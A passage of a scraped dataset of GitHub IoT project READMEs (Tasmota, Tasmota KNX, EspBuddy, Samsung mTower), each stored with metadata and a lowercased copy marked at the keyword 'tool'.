downloaded from http://ota.tasmota.com/tasmota/release/\nDevelopment\nSee CHANGELOG.md for detailed change information.\nUnless your Tasmota powered device exhibits a problem or you need to make use of a feature that is not available in the Tasmota version currently installed on your device, leave your device alone - it works so don't make unnecessary changes! If the release version (i.e., the master branch) exhibits unexpected behaviour for your device and configuration, you should upgrade to the latest development version instead to see if your problem is resolved as some bugs in previous releases or development builds may already have been resolved.\nEvery commit made to the development branch, which is compiling successfuly, will post new binary files at http://ota.tasmota.com/tasmota/ (this web address can be used for OTA updates too). It is important to note that these binaries are based on the current development codebase. These commits are tested as much as is possible and are typically quite stable. However, it is infeasible to test on the hundreds of different types of devices with all the available configuration options permitted.\nNote that there is a chance, as with any upgrade, that the device may not function as expected. You must always account for the possibility that you may need to flash the device via the serial programming interface if the OTA upgrade fails. Even with the master release, you should always attempt to test the device or a similar prototype before upgrading a device which is in production or is hard to reach. And, as always, make a backup of the device configuration before beginning any firmware update.\nDisclaimer\n\u26a0\ufe0f DANGER OF ELECTROCUTION \u26a0\ufe0f\nIf your device connects to mains electricity (AC power) there is danger of electrocution if not installed properly. If you don't know how to install it, please call an electrician (Beware: certain countries prohibit installation without a licensed electrician present). Remember: SAFETY FIRST. It is not worth the risk to yourself, your family and your home if you don't know exactly what you are doing. Never tinker or try to flash a device using the serial programming interface while it is connected to MAINS ELECTRICITY (AC power).\nWe don't take any responsibility nor liability for using this software nor for the installation or any tips, advice, videos, etc. given by any member of this site or any related site.\nNote\nPlease do not ask to add new devices unless it requires additional code for new features. If the device is not listed as a module, try using Templates first. If it is not listed in the Tasmota Device Templates Repository create your own Template.\nQuick Install\nDownload one of the released binaries from https://github.com/arendst/Tasmota/releases and flash it to your hardware using our installation guide.\nImportant User Compilation Information\nIf you want to compile Tasmota yourself keep in mind the following:\nFor ESP8285 based devices only Flash Mode DOUT is supported. Do not use Flash Mode DIO / QIO / QOUT as it might seem to brick your device.\nFor ESP8285 based devices Tasmota uses a 1M linker script WITHOUT spiffs 1M (no SPIFFS) for optimal code space.\nTo make compile time changes to Tasmota use the user_config_override.h file. It assures keeping your custom settings when you download and compile a new version. You have to make a copy from the provided user_config_override_sample.h file and add your setting overrides.\nConfiguration Information\nPlease refer to the installation and configuration articles in our documentation.\nMigration Information\nSee wiki migration path for instructions how to migrate to a major version. Pay attention to the following version breaks due to dynamic settings updates:\nMigrate to Sonoff-Tasmota 3.9.x\nMigrate to Sonoff-Tasmota 4.x\nMigrate to Sonoff-Tasmota 5.14\nMigrate to Sonoff-Tasmota 6.7.1 (http://ota.tasmota.com/tasmota/release-6.7.1/)\nMigrate to Tasmota 7.2.0 (http://ota.tasmota.com/tasmota/release-7.2.0/)\n--- Major change in parameter storage layout ---\nMigrate to Tasmota 8.5.1 (http://ota.tasmota.com/tasmota/release-8.5.1/)\n--- Major change in internal GPIO function representation ---\nMigrate to Tasmota 9.1 (http://ota.tasmota.com/tasmota/release-9.1.0/)\nWhile fallback or downgrading is common practice it was never supported due to Settings additions or changes in newer releases. Starting with version v9.0.0.1 the internal GPIO function representation has changed in such a way that fallback is only possible to the latest GPIO configuration before installing v9.0.0.1.\nSupport Information\nFor a database of supported devices see Tasmota Device Templates Repository\nIf you're looking for support on Tasmota there are some options available:\nDocumentation\nDocumentation Site: For information on how to flash Tasmota, configure, use and expand it\nFAQ and Troubleshooting: For information on common problems and solutions.\nCommands Information: For information on all the commands supported by Tasmota.\nSupport's Community\nTasmota Discussions: For Tasmota usage questions, Feature Requests and Projects.\nTasmota Users Chat: For support, troubleshooting and general questions. You have better chances to get fast answers from members of the Tasmota Community.\nSearch in Issues: You might find an answer to your question by searching current or closed issues.\nSoftware Problem Report: For reporting problems of Tasmota Software.\nContribute\nYou can contribute to Tasmota by\nProviding Pull Requests (Features, Proof of Concepts, Language files or Fixes)\nTesting new released features and report issues\nDonating to acquire hardware for testing and implementing or out of gratitude\nContributing missing documentation for features and devices\nCredits\nPeople helping to keep the show on the road:\nDavid Lang providing initial issue resolution and code optimizations\nHeiko Krupp for his IRSend, HTU21, SI70xx and Wemo/Hue emulation drivers\nWiktor Schmidt for Travis CI implementation\nThom Dietrich for PlatformIO optimizations\nMarinus van den Broek for his EspEasy groundwork\nPete Ba for more user friendly energy monitor calibration\nLobradov providing compile optimization tips\nFlexiti for his initial timer implementation\nreloxx13 for his TasmoAdmin management tool\nJoachim Banzhaf for his TSL2561 library and driver\nAndre Thomas for providing many drivers\nGijs Noorlander for his MHZ19, SenseAir and updated PubSubClient drivers\nErik Montnemery for his HomeAssistant Discovery concept and many code tuning tips\nFederico Leoni for continued HomeAssistant Discovery support\nAidan Mountford for his HSB support\nDaniel Ztolnai for his Serial Bridge implementation\nGerhard Mutz for multiple sensor & display drivers, Sunrise/Sunset, and scripting\nNuno Ferreira for his HC-SR04 driver\nAdrian Scillato for his (security)fixes and implementing and maintaining KNX\nGennaro Tortone for implementing and maintaining Eastron drivers\nRaymond Mouthaan for managing Wemos Wiki information\nNorbert Richter for his decode-config.py tool\nJoel Stein, digiblur and Shantur Rathore for their Tuya research and driver\nFrogmore42 for providing many issue answers\nJason2866 for platformio support and providing many issue answers\nBlakadder for managing the new document site and providing template management\nStephan Hadinger for refactoring light driver, enhancing HueEmulation and Zigbee support\ntmo for designing the official Tasmota logo\nStefan Bode for his Shutter and Deep sleep drivers\nJacek Zi\u00f3\u0142kowski for his TDM management tool and Tasmotizer flashing tool\nChristian Staars for NRF24L01 and HM-10 Bluetooth sensor support\nPaul Diem for UDP Group communication support\nJ\u00f6rg Sch\u00fcler-Maroldt for his initial ESP32 port\nJavier Arigita for his thermostat driver\nMany more providing Tips, Wips, Pocs, PRs and Donations\nLicense\nThis program is licensed under GPL-3.0", "link": "https://github.com/ascillato/Tasmota_KNX", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "tasmota knx\ntasmota_knx was a modification for tasmota to add a basic functionality of the knx ip protocol (multicast). now it is integrated in tasmota!\nthis repository is for developing new knx features for tasmota.\nif you like tasmota knx, give it a star or fork it and contribute!\nany help or comment is very welcome.\ntable of contents\nknx explanation\nintegration\nrequirements\nfirmware\nusage examples\nconsole commands\ndevelopment road map\nmodifications to tasmota\ncontributors\ntasmota readme\nknx explanation\nthe knx ip protocol is an international open standard for smart homes and smart buildings automation. it is a decentralized system. each device can talk directly to each other without the need of a central controller or server. any panel or server is just for telesupervision and for sending requests. knx ip protocol uses a udp multicast on 224.0.23.12 : 3671, so there is no need for a knx router unless you want to communicate to knx devices that are not in the wifi network (twisted pair, rf, powerline).\neach device has a physical address (like a fixed ip) as 1 . 1 . 0 and that address is used for configuration purposes.\neach device can be configured with group addresses as 2 / 2 / 1 and that address can be used for sending/receiving commands. so, for example, if 2 devices that are configured with the 2 / 2 / 1 for turning on/off their outputs, and other device send turn on command to 2 / 2 / 1, both devices will turn on their outputs.\nintegration\nseveral home automation systems have knx support. for example, home assistant has a xknx python library to connect to knx devices using a knx router. if you don't have a knx router, you can use a software knx router like knxd on the same raspberry pi than home assistant. knxd is used by home assistant for reading this udp multicast, although knxd has other cool features that need extra hardware like connect to knx devices by twister pair, power line or rf.\nif using the home assistant distribution called hassio, everything for knx is already included by default.\nif you use the ets (knx configurator software) you can add any tasmota knx as a dummy device.\nrequirements\nall the libraries required for tasmota are here along with the extra required for the knx driver:\nesp knx ip library. a copy of this modified library is also available here. the original is here.\nesp8266 board libraries:\nv2.7.4.7 works fine. no known issues. (recommended) (support for old libraries have been dropped)\nesp32 board libraries:\nv1.0.4.2 works fine. no known issues. (recommended) (support for old libraries have been dropped)\nfirmware\nyou can download the precompiled binaries for flashing esp8266, esp8285 and esp32 devices from:\nlatest release\nlatest development version from build_output folder.\nor if you need any other feature enabled or disabled, or a different arduino core, you can use tasmocompiler (readme) or you can modify the my_user_config.h file and build your firmware as explained in the docs.\nimplemented features\nthe implemented features (up to now) in knx for tasmota are:\ngeneral:\nbuttons (just push)\nrelays (on/off/toggle)\nlights (led strips, etc. but just on/off)\nsensor lists that you can use in knx is (only one sensor per type):\ntemperature\nhumidity\nenergy (v, i, power)\nfeatures that can be used with tasmota's rules:\nsend knx command (on/off)\nreceive knx command (on/off)\nsend values by knx (any float type, temperature for example)\nreceive values by knx (any float type, temperature for example)\nsend knx scenes (on/off)\nreceive knx scenes (on/off)\nreceive a knx read request\nview/set the physical address\nview/set group address to send data\nview/set group address to receive data\nusage examples\nthere are multiple possible configurations. here are explained just a few as example. the options for selecting relays, buttons, sensors, etc. are only available if were configured on configure module menu.\nto configure knx, enter on the configuration menu of tasmota and select configure knx.\nnote on knx communication enhancement option: as wifi multicast communication is not reliable in some wifi router due to igmp problems or snooping, an enhancement was implemented. this option increase the reliability by reducing the chances of losing telegrams, sending the same telegram 3 times. in practice it works really good and it is enough for normal home use. when this option is on, tasmota will ignore toggle commands by knx if those are sent more than 1 toggle per second. just 1 toggle per second is working fine.\n1) setting several tasmotas to be controlled as one by a home automation system:\nwe can set one of the group address to be the same in all the devices so as to turn them on or off at the same time. in this case, so as to inform the status of all the relays to the automation system, just one of the devices have to be configured as the responder. if you use the same group address for sending and receiving, you have to take into account not to make loops.\ndevice 1\ndevice 2\n2) setting 2 tasmotas to be linked as stair lights:\nwe can set one device to send the status of its output and another to read that and follow. and the second device can send the status of its button and the first device will toggle. with this configuration we can avoid to make a loop.\ndevice 1\ndevice 2\n3) setting a button as initiator of a scene:\njust setting one device to send the push of a button, and the rest just use that value to turn them on. in this case, there is no toggle. every time the button is pushed, the turn on command is sent.\ndevice 1\ndevice 2\n4) setting a temperature sensor:\nwe can configure to send the value of temperature or humidity every teleperiod. this teleperiod can be configured. see tasmota wiki. it is recommended also to set the reply temperature address.\n5) using rules:\nmore functionality can be added to tasmota using rules.\nin the knx menu, can be set a group address to send data or commands by rules, as knx tx1 to knx tx5\nin rules we can use the command knxtx_cmnd1 1 to send an on state command to the group address set in knx tx1 slot of the knx menu. also, we can use the command knxtx_val1 15 to send a 15 value to the group address set in knx tx1 slot of the knx menu.\nin the knx menu can be set a group address to receive commands by rules as knx rx1 to knx rx5\nin rules we can use the events to catch the reception of commands from knx to those rx slots.\nexample: rule on event#knxrx_cmnd1 do var1 %value% endon to store the command received in the variable var1\nin rules we can use the events to catch the reception of values from knx to those rx slots.\nexample: rule on event#knxrx_val1 do var1 %value% endon to store the value received in the variable var1\nalso, if a read request is received from knx network, we can use that in a rule as for example: rule on event#knxrx_req1 do knxtx_val1 %var3% endon\nconsole commands\ncommand payload description\nknxtx_cmnd<x> 0 / 1 send knx commands using the group address set on knx menu at knx_tx<x> slot\nknxtx_val<x> value send knx float values using the group address set on knx menu at knx_tx<x> slot\nknx_enabled view status of knx communications\n0 / 1 0 - set disable to knx communications / 1 - set enable to knx communications\nknx_enhanced view status of enhanced mode for knx communications\n0 / 1 0 - set to disable / 1 - set to enable enhanced knx communications mode\nknx_pa view the device knx physical address (0.0.0 means not set)\n<x>.<x>.<x> set the device knx physical address (like 1.1.0)\nknx_ga view the number of group address configured to send data/commands\n<x> view the configuration for the group address number x send data/commands\nknx_ga<x> <y>,<z>,<z>,<z> set the group address number <x> to send data/commands\n<y> is the parameter option to send its status to the group address\n<z>,<z>,<z> is the group address number to send data/commands\nknx_cb view the number of group address configured to receive data/commands\n<x> view the configuration for the group address number x to receive data/commands\nknx_cb<x> <y>,<z>,<z>,<z> set the group address number <x> to receivedata/commands\n<y> is the parameter option to receive its status from the group address\n<z>,<z>,<z> is the group address number to receive data/commands\nposible values for the parameter option:\noption value device parameter\n1 relay 1\n2 relay 2\n3 relay 3\n4 relay 4\n5 relay 5\n6 relay 6\n7 relay 7\n8 relay 8\n9 button 1\n10 button 2\n11 button 3\n12 button 4\n13 button 5\n14 button 6\n15 button 7\n16 button 8\n17 temperature\n18 humidity\n19 energy_voltage\n20 energy_current\n21 energy_power\n22 energy_powerfactor\n23 energy_daily\n24 energy_start\n25 energy_total\n26 knx_slot1\n27 knx_slot2\n28 knx_slot3\n29 knx_slot4\n30 knx_slot5\n31 knx_scene\n255 empty\ndevelopment road map\nfor tasmota_knx:\nadd web menu\nadd feature to receive telegrams and modify relay status\nadd feature to receive telegrams from multiple group addresses to modify just one relay status (useful for scenes)\nadd feature to send telegrams of relay status change\nadd feature to send telegrams of one relay status to multiple group addresses (useful for scenes)\nadd feature to send telegrams of button pressed\nadd feature to receive telegrams to toggle relay status\nadd feature to read temperature, humidity from tasmota\nadd feature to send temperature, humidity by a set interval (tasmota teleperiod)\nadd feature to receive command to read temperature, humidity\nadd feature to recognize tasmota config to show the same number of relays, buttons, etc.\nadd feature to save config\nadd feature to load config\nadd log info\ncomplete all the language files with keys\nadd support for other output devices supported by tasmota\nadd support for other sensors supported by tasmota (temp, hum, energy)\nadd commands for rules to send values and commands by knx\nadd commands for rules to set knx configurations\nadd events for rules when receiving data from knx and read requests\nadd option for increase communication reliability (re send telegrams)\nadd scenes support\nadd dimmer support\nadd color support\nadd shutters support\noptimize code to reduce flash and ram - refactor driver and library\nadd option to support ets programming\nadd option for knxnet/ip tunneling\nmodifications to tasmota\nadded the file /tasmota/xdrv_11_knx.ino\nadded the entries #define use_knx and #define use_knx_web_menu on /tasmota/my_user_config.h\nadded entries to the file /tasmota/xdrv_01_webserver.ino\nadded entries to the file /tasmota/tasmota.ino\nadded entries to the file /tasmota/tasmota.h\nadded entries to the file /tasmota/settings.h\nadded entries to the file /tasmota/support.ino\nadded entries to sensor files\nadded entries to language files\nup to now, enabling knx uses +9.4 kb of code and +3.7 kb of memory for tasmota. if it is enabled also the knx web menu, it adds +8.3 kb more of code and +144 bytes more of memory.\nthere is no conflict with mqtt, home assistant, web, etc. tests show fast response of all features running at same time.\ncontributors\nascillato ( adrian scillato )\nsisamiwe - thanks for the guide on using knx and software testing and support\nenvy ( nico weichbrodt ) - thanks for the patience and help with the modifications to esp_knx_ip.\narendst ( theo arends ) - thanks for the guide on tasmota and for the ideas.\njohannesbonn - thanks for the patience on bug resolutions\nrocketsience - thanks for the patience on bug resolutions\njeylites - thanks for the patience on bug resolutions\nwinni66 - thanks for the patience on bug resolutions\nmisc2000 - thanks for the testing on bug resolutions\nmizrachiran ( ran mizrachi ) - thanks for the testing on bug resolutions\nsmurfix ( matthias urlichs ) - thanks for the knx guiding and knxd use.\nand many others providing testing, bug reporting and feature requests.\ntasmota readme\nalternative firmware for esp8266 and esp32 based devices with easy configuration using webui, ota updates, automation using timers or rules, expandability and entirely local control over mqtt, http, serial or knx. written for platformio with limited support for arduino ide.\nif you like tasmota, give it a star, or fork it and contribute!\nsee releasenotes.md for release information.\nin addition to the release webpage the binaries can also be downloaded from http://ota.tasmota.com/tasmota/release/\ndevelopment\nsee changelog.md for detailed change information.\nunless your tasmota powered device exhibits a problem or you need to make use of a feature that is not available in the tasmota version currently installed on your device, leave your device alone - it works so don't make unnecessary changes! if the release version (i.e., the master branch) exhibits unexpected behaviour for your device and configuration, you should upgrade to the latest development version instead to see if your problem is resolved as some bugs in previous releases or development builds may already have been resolved.\nevery commit made to the development branch, which is compiling successfuly, will post new binary files at http://ota.tasmota.com/tasmota/ (this web address can be used for ota updates too). it is important to note that these binaries are based on the current development codebase. these commits are tested as much as is possible and are typically quite stable. however, it is infeasible to test on the hundreds of different types of devices with all the available configuration options permitted.\nnote that there is a chance, as with any upgrade, that the device may not function as expected. you must always account for the possibility that you may need to flash the device via the serial programming interface if the ota upgrade fails. even with the master release, you should always attempt to test the device or a similar prototype before upgrading a device which is in production or is hard to reach. and, as always, make a backup of the device configuration before beginning any firmware update.\ndisclaimer\n\u26a0\ufe0f danger of electrocution \u26a0\ufe0f\nif your device connects to mains electricity (ac power) there is danger of electrocution if not installed properly. if you don't know how to install it, please call an electrician (beware: certain countries prohibit installation without a licensed electrician present). remember: safety first. it is not worth the risk to yourself, your family and your home if you don't know exactly what you are doing. never tinker or try to flash a device using the serial programming interface while it is connected to mains electricity (ac power).\nwe don't take any responsibility nor liability for using this software nor for the installation or any tips, advice, videos, etc. given by any member of this site or any related site.\nnote\nplease do not ask to add new devices unless it requires additional code for new features. if the device is not listed as a module, try using templates first. if it is not listed in the tasmota device templates repository create your own template.\nquick install\ndownload one of the released binaries from https://github.com/arendst/tasmota/releases and flash it to your hardware using our installation guide.\nimportant user compilation information\nif you want to compile tasmota yourself keep in mind the following:\nfor esp8285 based devices only flash mode dout is supported. do not use flash mode dio / qio / qout as it might seem to brick your device.\nfor esp8285 based devices tasmota uses a 1m linker script without spiffs 1m (no spiffs) for optimal code space.\nto make compile time changes to tasmota use the user_config_override.h file. it assures keeping your custom settings when you download and compile a new version. you have to make a copy from the provided user_config_override_sample.h file and add your setting overrides.\nconfiguration information\nplease refer to the installation and configuration articles in our documentation.\nmigration information\nsee wiki migration path for instructions how to migrate to a major version. pay attention to the following version breaks due to dynamic settings updates:\nmigrate to sonoff-tasmota 3.9.x\nmigrate to sonoff-tasmota 4.x\nmigrate to sonoff-tasmota 5.14\nmigrate to sonoff-tasmota 6.7.1 (http://ota.tasmota.com/tasmota/release-6.7.1/)\nmigrate to tasmota 7.2.0 (http://ota.tasmota.com/tasmota/release-7.2.0/)\n--- major change in parameter storage layout ---\nmigrate to tasmota 8.5.1 (http://ota.tasmota.com/tasmota/release-8.5.1/)\n--- major change in internal gpio function representation ---\nmigrate to tasmota 9.1 (http://ota.tasmota.com/tasmota/release-9.1.0/)\nwhile fallback or downgrading is common practice it was never supported due to settings additions or changes in newer releases. starting with version v9.0.0.1 the internal gpio function representation has changed in such a way that fallback is only possible to the latest gpio configuration before installing v9.0.0.1.\nsupport information\nfor a database of supported devices see tasmota device templates repository\nif you're looking for support on tasmota there are some options available:\ndocumentation\ndocumentation site: for information on how to flash tasmota, configure, use and expand it\nfaq and troubleshooting: for information on common problems and solutions.\ncommands information: for information on all the commands supported by tasmota.\nsupport's community\ntasmota discussions: for tasmota usage questions, feature requests and projects.\ntasmota users chat: for support, troubleshooting and general questions. you have better chances to get fast answers from members of the tasmota community.\nsearch in issues: you might find an answer to your question by searching current or closed issues.\nsoftware problem report: for reporting problems of tasmota software.\ncontribute\nyou can contribute to tasmota by\nproviding pull requests (features, proof of concepts, language files or fixes)\ntesting new released features and report issues\ndonating to acquire hardware for testing and implementing or out of gratitude\ncontributing missing documentation for features and devices\ncredits\npeople helping to keep the show on the road:\ndavid lang providing initial issue resolution and code optimizations\nheiko krupp for his irsend, htu21, si70xx and wemo/hue emulation drivers\nwiktor schmidt for travis ci implementation\nthom dietrich for platformio optimizations\nmarinus van den broek for his espeasy groundwork\npete ba for more user friendly energy monitor calibration\nlobradov providing compile optimization tips\nflexiti for his initial timer implementation\nreloxx13 for his tasmoadmin management -----> tool !!! \njoachim banzhaf for his tsl2561 library and driver\nandre thomas for providing many drivers\ngijs noorlander for his mhz19, senseair and updated pubsubclient drivers\nerik montnemery for his homeassistant discovery concept and many code tuning tips\nfederico leoni for continued homeassistant discovery support\naidan mountford for his hsb support\ndaniel ztolnai for his serial bridge implementation\ngerhard mutz for multiple sensor & display drivers, sunrise/sunset, and scripting\nnuno ferreira for his hc-sr04 driver\nadrian scillato for his (security)fixes and implementing and maintaining knx\ngennaro tortone for implementing and maintaining eastron drivers\nraymond mouthaan for managing wemos wiki information\nnorbert richter for his decode-config.py -----> tool !!! \njoel stein, digiblur and shantur rathore for their tuya research and driver\nfrogmore42 for providing many issue answers\njason2866 for platformio support and providing many issue answers\nblakadder for managing the new document site and providing template management\nstephan hadinger for refactoring light driver, enhancing hueemulation and zigbee support\ntmo for designing the official tasmota logo\nstefan bode for his shutter and deep sleep drivers\njacek zi\u00f3\u0142kowski for his tdm management -----> tool !!!  and tasmotizer flashing -----> tool !!! \nchristian staars for nrf24l01 and hm-10 bluetooth sensor support\npaul diem for udp group communication support\nj\u00f6rg sch\u00fcler-maroldt for his initial esp32 port\njavier arigita for his thermostat driver\nmany more providing tips, wips, pocs, prs and donations\nlicense\nthis program is licensed under gpl-3.0", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000903, "year": null}, {"Unnamed: 0": 907, "autor": 907, "date": null, "content": "Esp Buddy\nTired of typing very long commands to upload your custom firmwares?\nBored to manually upload your firmwares in two steps for 1MB devices?\nWant to batch upload new firmwares to all your devices via OTA or backup all settings in one command?\nNeed a solid tool to discover, control or flash Sonoff DIY devices (ie Sonoff Mini)\nThis script allows you to easily upload firmwares to remote (ESP8266 based) devices via Wifi (Over The Air) or Serial, in one short command. It also gathers various tool commands to be used in batch mode.\nFeatures\nOTA upload on 4M devices\nOTA upload on 1M devices using an intermediate firmware (automatic two steps)\nUse configuration presets for devices\nOptional compilation using platformio\nOptionally pass various -D flags to the compiler, including extracted parameters like IP or hostname\nFetch versions of remote devices\nArchive current firmware & previous firmware per target\nBackup current settings & previous settings per target\nParse Repositories installed versions\nGit Pull Repositories\nPing Remote Host\nSonoff DIY: scan network for devices in DIY mode\nSonoff DIY: total control using the Ithead factory API.\nSonoff DIY: replace the factory firmware with any other one (default to Tasmota) OTA. (see #20 )\nSonoff DIY: cross-platform support (Mac, Win, Linux)\nSupported Firmwares\nWorks with :\nESPeasy\nEspurna\nTasmota\nshould virtually work with any ESP8266 firmware: just add a small espb_repo_xxx class to describe it.\nRequirements\nLinux or OSX Operating System (+ Windows for some method only)\nphp5 or newer\nPlatformIO needed only for compiling\nInstallation\nRename config-sample.php to config.php.\nFill in some hosts and configurations in config.php\nUsage\nespbuddy.php ACTION [TARGET] [OPTIONS]\nValid Actions are:\nupload : Build and/or Upload current repo version to Device(s)\nbuild : Build current repo version\nbackup : Backup remote devices' settings\nmonitor : Monitor the serial port\nversion : Show Device(s) Version\nreboot : Reboot remote devive\ngpios : Test (On/Off) each GPIOs\nping : Ping Device(s)\nsonodiy : Discover, Control or Flash Sonoff devices in DIY mode\nrepo_version : Show Repo's Current version\nrepo_pull : Git Pull Repo's master version\nlist_hosts : List all available hosts\nlist_configs : List all available configurations\nlist_repos : List all available repositories\nself : EspBuddy maintenance tools\nhelp : Show full help\nExamples:\nespbuddy.php upload select the one to upload to from the list of targets\nespbuddy.php upload relay1 upload to target 'relay1'\nespbuddy.php upload all -b upload to all defined targets, while building the firmware first\nespbuddy.php upload relay1 -w upload using serial to target 'relay1'\nespbuddy.php upload relay1 -web build 'relay1', then using serial port, erase first and upload\nespbuddy.php backup all backup settings ofall defined targets\nespbuddy.php monitor relay1 --rate=9600 serial monitors 'relay1' target at 9600 bauds\nespbuddy.php version all show versions of all defined targets\nespbuddy.php ping all ping the all defined targets\nespbuddy.php sonodiy flash 192.168.1.10 1000abc1ef flashes a (default) Tasmota firmware into a Sonoff Mini in DIY mode\nSee more command examples ...\nContribute\nWhether you are a developer or a regular user, your help is most welcome!\nLicence\nThis program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.\nThis program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.\nYou should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.", "link": "https://github.com/soif/EspBuddy", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "esp buddy\ntired of typing very long commands to upload your custom firmwares?\nbored to manually upload your firmwares in two steps for 1mb devices?\nwant to batch upload new firmwares to all your devices via ota or backup all settings in one command?\nneed a solid -----> tool !!!  to discover, control or flash sonoff diy devices (ie sonoff mini)\nthis script allows you to easily upload firmwares to remote (esp8266 based) devices via wifi (over the air) or serial, in one short command. it also gathers various tool commands to be used in batch mode.\nfeatures\nota upload on 4m devices\nota upload on 1m devices using an intermediate firmware (automatic two steps)\nuse configuration presets for devices\noptional compilation using platformio\noptionally pass various -d flags to the compiler, including extracted parameters like ip or hostname\nfetch versions of remote devices\narchive current firmware & previous firmware per target\nbackup current settings & previous settings per target\nparse repositories installed versions\ngit pull repositories\nping remote host\nsonoff diy: scan network for devices in diy mode\nsonoff diy: total control using the ithead factory api.\nsonoff diy: replace the factory firmware with any other one (default to tasmota) ota. (see #20 )\nsonoff diy: cross-platform support (mac, win, linux)\nsupported firmwares\nworks with :\nespeasy\nespurna\ntasmota\nshould virtually work with any esp8266 firmware: just add a small espb_repo_xxx class to describe it.\nrequirements\nlinux or osx operating system (+ windows for some method only)\nphp5 or newer\nplatformio needed only for compiling\ninstallation\nrename config-sample.php to config.php.\nfill in some hosts and configurations in config.php\nusage\nespbuddy.php action [target] [options]\nvalid actions are:\nupload : build and/or upload current repo version to device(s)\nbuild : build current repo version\nbackup : backup remote devices' settings\nmonitor : monitor the serial port\nversion : show device(s) version\nreboot : reboot remote devive\ngpios : test (on/off) each gpios\nping : ping device(s)\nsonodiy : discover, control or flash sonoff devices in diy mode\nrepo_version : show repo's current version\nrepo_pull : git pull repo's master version\nlist_hosts : list all available hosts\nlist_configs : list all available configurations\nlist_repos : list all available repositories\nself : espbuddy maintenance tools\nhelp : show full help\nexamples:\nespbuddy.php upload select the one to upload to from the list of targets\nespbuddy.php upload relay1 upload to target 'relay1'\nespbuddy.php upload all -b upload to all defined targets, while building the firmware first\nespbuddy.php upload relay1 -w upload using serial to target 'relay1'\nespbuddy.php upload relay1 -web build 'relay1', then using serial port, erase first and upload\nespbuddy.php backup all backup settings ofall defined targets\nespbuddy.php monitor relay1 --rate=9600 serial monitors 'relay1' target at 9600 bauds\nespbuddy.php version all show versions of all defined targets\nespbuddy.php ping all ping the all defined targets\nespbuddy.php sonodiy flash 192.168.1.10 1000abc1ef flashes a (default) tasmota firmware into a sonoff mini in diy mode\nsee more command examples ...\ncontribute\nwhether you are a developer or a regular user, your help is most welcome!\nlicence\nthis program is free software; you can redistribute it and/or modify it under the terms of the gnu general public license as published by the free software foundation; either version 3 of the license, or (at your option) any later version.\nthis program is distributed in the hope that it will be useful, but without any warranty; without even the implied warranty of merchantability or fitness for a particular purpose. see the gnu general public license for more details.\nyou should have received a copy of the gnu general public license along with this program; if not, write to the free software foundation, inc., 51 franklin street, fifth floor, boston, ma 02110-1301 usa.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000907, "year": null}, {"Unnamed: 0": 927, "autor": 927, "date": null, "content": "mTower\nContents\nIntroduction\nLicense\nPlatforms supported\nGet and build mTower software\nSource code structure\nCoding standards\nDocumentation\nContributing\n1. Introduction\nThe mTower is a new Trusted Execution Environment (TEE) specially designed to protect size-constrained IoT devices based on Cortex-m23 MCU. Usage mTower pre-embedded into the microcontroller, a module developer can use a simple SDK that based on Global Platform API standards to add security to their solution.\n2. License\nmTower software consists of multiple components that are individually available under different licensing terms. Terms for each individual file are listed at the beginnings of corresponding files; also, all licenses are listed in COPYING file.\n3. Platforms supported\nNuMaker-PFM-M2351 M2351-Badge How to add a platform\nSeveral platforms are supported. In order to manage slight differences between platforms, a PLATFORM flag has been introduced.\nPlatform Composite PLATFORM flag Maintained\nNuMaker-PFM-M2351 PLATFORM=numaker_pfm_m2351 v0.3\nM2351-Badge PLATFORM=m2351_badge v0.3\nFor information on adding a new platform see the how to add a platform.\n4. Get and build mTower software\nPlease see build for instructions how to run mTower on various devices.\n5. Source code structure\nThe general source code structure for mTower is similar to the structure of the multy platforms source code.\n6. Coding standards\nIn this project we are trying to adhere to the mTower coding convention (see CodingStyle). However there are a few exceptions that we had to make since the code also uses other open source components.\n7. Documentation\nThere is a brief overall functionality description of mTower. Other mTower documentation for the project is located in the docs folder. The latest version of the specification that describes the mTower source code can be generated using doxygen tool from command line. To generate documentation, use\n$ make docs_gen\ncommand, and to view generated docs use\n$ make docs_show\nNote that documentation on mTower is work in progress, and right now doxygen does not provide much documentation.\n8. Contributing\nIf you want to contribute to the mTower project and make it better, your help is very welcome. Contributing is also a great way to learn more about social coding on Github, new technologies and and their ecosystems. How to contribute you can find here.", "link": "https://github.com/Samsung/mTower", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "mtower\ncontents\nintroduction\nlicense\nplatforms supported\nget and build mtower software\nsource code structure\ncoding standards\ndocumentation\ncontributing\n1. introduction\nthe mtower is a new trusted execution environment (tee) specially designed to protect size-constrained iot devices based on cortex-m23 mcu. usage mtower pre-embedded into the microcontroller, a module developer can use a simple sdk that based on global platform api standards to add security to their solution.\n2. license\nmtower software consists of multiple components that are individually available under different licensing terms. terms for each individual file are listed at the beginnings of corresponding files; also, all licenses are listed in copying file.\n3. platforms supported\nnumaker-pfm-m2351 m2351-badge how to add a platform\nseveral platforms are supported. in order to manage slight differences between platforms, a platform flag has been introduced.\nplatform composite platform flag maintained\nnumaker-pfm-m2351 platform=numaker_pfm_m2351 v0.3\nm2351-badge platform=m2351_badge v0.3\nfor information on adding a new platform see the how to add a platform.\n4. get and build mtower software\nplease see build for instructions how to run mtower on various devices.\n5. source code structure\nthe general source code structure for mtower is similar to the structure of the multy platforms source code.\n6. coding standards\nin this project we are trying to adhere to the mtower coding convention (see codingstyle). however there are a few exceptions that we had to make since the code also uses other open source components.\n7. documentation\nthere is a brief overall functionality description of mtower. other mtower documentation for the project is located in the docs folder. the latest version of the specification that describes the mtower source code can be generated using doxygen -----> tool !!!  from command line. to generate documentation, use\n$ make docs_gen\ncommand, and to view generated docs use\n$ make docs_show\nnote that documentation on mtower is work in progress, and right now doxygen does not provide much documentation.\n8. contributing\nif you want to contribute to the mtower project and make it better, your help is very welcome. contributing is also a great way to learn more about social coding on github, new technologies and and their ecosystems. how to contribute you can find 